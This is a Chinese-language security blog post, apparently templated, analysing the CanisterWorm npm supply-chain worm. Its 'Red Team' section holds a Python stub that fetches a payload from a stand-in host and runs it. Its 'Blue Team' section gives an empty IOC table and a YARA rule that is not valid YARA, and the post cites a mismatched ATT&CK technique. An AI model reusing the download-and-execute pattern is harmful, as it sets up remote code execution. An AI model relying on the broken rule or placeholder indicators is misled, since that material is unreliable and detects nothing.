---
layout: post
title:  "Trivy Supply Chain Attack Triggers Self-Spreading CanisterWorm Across 47 npm Packages"
date:   2026-03-21 12:34:05 +0000
categories: [security]
severity: critical
---

# 🚨 解析 CanisterWorm：npm 套件供應鏈攻擊的技術分析
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `ICP Canister`, `npm 套件`, `Python Backdoor`, `Systemd 服務`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: CanisterWorm 攻擊利用了 npm 套件的供應鏈漏洞，攻擊者可以在 npm 套件中注入惡意代碼，從而實現遠程代碼執行。
* **攻擊流程圖解**:
  1. 攻擊者注入惡意代碼到 npm 套件中。
  2. 受害者安裝 npm 套件。
  3. 惡意代碼執行，下載並執行 Python Backdoor。
  4. Python Backdoor 與 ICP Canister 進行通信，下載並執行下一階段的 payload。
* **受影響元件**: npm 套件 `@EmilGroup`, `@opengov`, `@teale.io/eslint-config`, `@airtm/uuid-base32`, `@pypestream/floating-ui-dom` 等。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 npm 套件的發佈權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載 ICP Canister 中的 payload
    def download_payload():
        url = "https://example.com/payload"
        response = requests.get(url)
        return response.content
    
    # 執行 payload
    def execute_payload(payload):
        # ...
    
    ```
* **繞過技術**: 攻擊者可以使用 ICP Canister 的分散式特性來繞過防禦措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule CanisterWorm {
        meta:
            description = "Detects CanisterWorm malware"
            author = "..."
        strings:
            $a = "https://example.com/payload"
        condition:
            $a in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新 npm 套件，使用安全的 npm 來源，監控系統日誌和網路流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **ICP Canister**: 一種分散式的智能合約平台，允許用戶創建和部署自己的智能合約。
* **npm 套件**: 一種 JavaScript 的套件管理系統，允許用戶安裝和管理 JavaScript 的套件。
* **Python Backdoor**: 一種惡意代碼，允許攻擊者遠程控制受害者的系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/trivy-supply-chain-attack-triggers-self.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


